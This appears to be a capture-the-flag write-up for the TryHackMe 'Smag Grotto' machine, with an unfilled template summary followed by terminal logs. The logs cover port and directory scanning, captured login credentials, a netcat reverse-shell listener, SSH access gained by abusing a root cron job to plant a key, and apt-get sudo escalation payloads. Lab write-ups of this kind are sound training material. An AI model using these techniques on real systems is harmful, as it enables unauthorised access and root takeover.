# [Smag Grotto] - [THM]  
**Difficulty:** [Easy]  
**OS:** [Linux]

---

## 1. Summary
- **Objective:** Short description of the machine goal (user/root/flags/etc.)  
- **Description:** Brief overview of the target, services, and challenges.  
- **Skills Practiced:** Enumeration, exploitation, privilege escalation, web, binary, etc.

---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.201.36.20 -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 12:03 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
Initiating Ping Scan at 12:03
Scanning 10.201.36.20 [4 ports]
Completed Ping Scan at 12:03, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:03
Completed Parallel DNS resolution of 1 host. at 12:03, 0.06s elapsed
Initiating SYN Stealth Scan at 12:03
Scanning 10.201.36.20 [1000 ports]
Discovered open port 22/tcp on 10.201.36.20
Discovered open port 80/tcp on 10.201.36.20
Completed SYN Stealth Scan at 12:03, 4.11s elapsed (1000 total ports)
Initiating Service scan at 12:03
Scanning 2 services on 10.201.36.20
Completed Service scan at 12:03, 6.74s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.201.36.20
Initiating Traceroute at 12:03
Completed Traceroute at 12:03, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:03
Completed Parallel DNS resolution of 2 hosts. at 12:03, 6.55s elapsed
NSE: Script scanning 10.201.36.20.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:04, 12.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 1.22s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Nmap scan report for 10.201.36.20
Host is up, received reset ttl 61 (0.26s latency).
Scanned at 2025-09-13 12:03:25 IST for 37s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDORe0Df8XvRlc3MvkqhpqAX5/sbUoEiIckKSVOLJVmWb9jOq2r0AfjaYAAZzgH9RThlwbzjGj6r4yBsXrMFB01qemsYBzUkut9Q12P+uly9+SeL6X7CUavLnkcAz0bzkqQpIFLG9HUyu9ysmZqE1Xo6NumtNh3Bf4H1BbS+cRntagn1TreTWJUiT+s7Gr9KEIH7rQUM8jX/eD/zNTKMN9Ib6/TM7TkPxAnOSw5JRfTV/oC8fFGqvjcAMxlhqS44AL/ZziI50OrCX9rMKtjZuvPaW2U31Sr8nUmtd3jnJPjMH2ZRfeRTPybYOblPOZq5lV2Fu4TwF/xOv2OrACLDxj5
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN6hWP9VGah8N9DAM3Kb0OZlIEttMMjf+PXwLWfHf0dz6OtdbrEjblgrck0i7fT95F1qdRJHtBdEu5yg4r6/gkY=
|   256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWHQ800Vx/X5aGSIDdpkEuKgFDxnjak46F/IsegN2Ju
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/13%OT=22%CT=1%CU=31545%PV=Y%DS=4%DC=T%G=Y%TM=68C5105
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 204.567 days (since Thu Feb 20 22:27:22 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   203.76 ms 10.8.0.1
2   ... 3
4   268.67 ms 10.201.36.20

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.34 seconds
           Raw packets sent: 1262 (56.286KB) | Rcvd: 1112 (45.218KB)
```
---
```bash
┌──(sabeshan㉿kali)-[~]
└─$ gobuster dir -u http://10.201.36.20/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.36.20/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 301) [Size: 311] [--> http://10.201.36.20/mail/]
```
---

<img width="1919" height="886" alt="image" src="https://github.com/user-attachments/assets/242b07a7-1911-400d-be63-86993c33cdcc" />

---

<img width="1919" height="945" alt="image" src="https://github.com/user-attachments/assets/bc842d40-db25-4620-b2d2-ee4107acb1d8" />

---

```bash
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

```
---

<img width="1691" height="564" alt="image" src="https://github.com/user-attachments/assets/8c26ae28-2996-425b-bf82-52d478226065" />

---

```bash

┌──(sabeshan㉿kali)-[~]
└─$ nc -lvnp 1337                      
listening on [any] 1337 ...
connect to [10.8.183.109] from (UNKNOWN) [10.201.36.20] 59454
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@smag:/var/www/development.smag.thm$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~]
└─$ stty raw -echo; fg          
[1]  + continued  nc -lvnp 1337

www-data@smag:/var/www/development.smag.thm$

```

---

```bash
www-data@smag:/var/www/development.smag.thm$ cd /opt
www-data@smag:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jun  4  2020 .
drwxr-xr-x 22 root root 4096 Jun  4  2020 ..
drwxr-xr-x  2 root root 4096 Jun  4  2020 .backups
www-data@smag:/opt$ cd .backups
www-data@smag:/opt/.backups$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jun  4  2020 .
drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
-rw-rw-rw- 1 root root  563 Jun  5  2020 jake_id_rsa.pub.backup
www-data@smag:/opt/.backups$ cat jake_id_rsa.pub.backup 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5HGAnm2nNgzDW9OPAZ9dP0tZbvNrIJWa/swbWX1dogZPCFYn8Ys3P7oNPyzXS6ku72p
viGs5kQsxNWpPY94bt2zvd1J6tBw5g64ox3BhCG4cUvuI5zEi7y+xnIiTs5/MoF/gjQ2IdNDdvMs/hDj4wc2x8TFLPlCmR1b/uHydkuvdtw9WzZN1O+Ax3yEkMfB8fO3F
7UqN2798wBPpRNNysQ+59zIUbV9kJpvARBILjIupikOsTs8FMMp2Um6aSpFKWzt15na0vou0riNXDTgt6WtPYxmtv1
AHE4VdD6xFJrM5CGffGbYEQjvJoFX2+vSOCDEFZw1SjuajykOaEOfheuY96Ao3f41m2Sn7Y9XiDt1UP4/
Sm27nWG3jRgvPZsFgFyE00ZTP5dtrmoNf0CbzQBriJUa596XEsSOMmcjgoVgQUIr+WYNGWXgpH8G+ipFP/5whaJiqPIfPfvEHbT4m5ZsSaXuDmKercFeRDs= kali@kali
www-data@smag:/opt/.backups$ 
```

---

```bash

www-data@smag:/opt/.backups$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
RDqXu9/0WiuZTlWm44ER1RD1slhQefcegcG sabeshan@kali" > jake_id_rsa.pub.backup lO4a 
www-data@smag:/opt/.backups$ cat jake_id_rsa.pub.backup 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMMbulO4aRDqXu9/0WiuZTlWm44ER1RD1slhQefcegcG sabeshan@kali
www-data@smag:/opt/.backups$ 

```

---
```bash

┌──(sabeshan㉿kali)-[~/thm/smag]
└─$ ssh -i jake jake@10.201.36.20
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
jake@smag:~$ sudo apt-get changelog apt
0% [Connecting to changelogs.ubuntu.com (185.125.190.18)]!/bin/sh
0% [Connecting to changelogs.ubuntu.com (185.125.190.18)]^C
jake@smag:~$ TF=$(mktemp)
jake@smag:~$ echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
jake@smag:~$ sudo apt-get install -c $TF sl
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following package was automatically installed and is no longer required:
  libplymouth4
Use 'sudo apt autoremove' to remove it.
The following NEW packages will be installed:
  sl
0 upgraded, 1 newly installed, 0 to remove and 3 not upgraded.
Need to get 24.4 kB of archives.
After this operation, 86.0 kB of additional disk space will be used.
0% [Connecting to ubuntu-mirror-3.ps6.canonical.com (91.189.91.83)]ls
0% [Connecting to ubuntu-mirror-3.ps6.canonical.com (91.189.91.83)]
0% [Connecting to ubuntu-mirror-3.ps6.canonical.com (91.189.91.83)]^C
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# 
```
